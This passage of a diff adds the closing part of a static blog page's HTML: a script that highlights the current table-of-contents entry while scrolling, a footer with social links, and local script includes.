+      tocLinks.forEach(function(a) { a.classList.remove('active'); });
+      tocLis.forEach(function(li) { li.classList.remove('has-active'); });
+
+      link.classList.add('active');
+      var li = link.closest('li');
+      while (li) {
+        li.classList.add('has-active');
+        var parentUl = li.parentElement;
+        if (!parentUl || parentUl.id === 'TableOfContents') break;
+        li = parentUl.closest('li');
+      }
+    }
+
+    var observer = new IntersectionObserver(function(entries) {
+      var topEntry = null;
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          if (!topEntry || entry.boundingClientRect.top < topEntry.boundingClientRect.top) {
+            topEntry = entry;
+          }
+        }
+      });
+      if (topEntry) {
+        setActive('#' + topEntry.target.id);
+      }
+    }, {
+      rootMargin: '-80px 0px -50% 0px',
+      threshold: 0
+    });
+
+    headings.forEach(function(h) { observer.observe(h); });
+  })();
+  </script></main><footer class="footer">
+  <div class="footer-container"><hr class="footer-divider">
+
+    <div class="footer-row"><div class="footer-social">
+        <a href="https://github.com/L1nq0" target="_blank" rel="noopener noreferrer" class="footer-icon" title="GitHub">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"/>
+          </svg>
+        </a>
+        <a href="mailto:cryp71csec@gmail.com" class="footer-icon" title="Email">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z"/>
+            <path d="M3 7l9 6l9 -6"/>
+          </svg>
+        </a>
+      </div><div class="footer-line">
+        <span>Copyright &copy; 2026</span>
+        <span class="footer-sep">|</span>
+        <span>All rights reserved.</span>
+      </div>
+    </div>
+  </div>
+</footer>
+</div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars" aria-hidden="true"></i></div><div class="fixed-button view-comments d-none" role="button" aria-label="View Comments"><i class="fa-solid fa-comment" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/cell-tooltip/cell-tooltip.umd.js" defer></script><script src="/js/config/4a243c22a05f936636916c9564a8cf3d.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
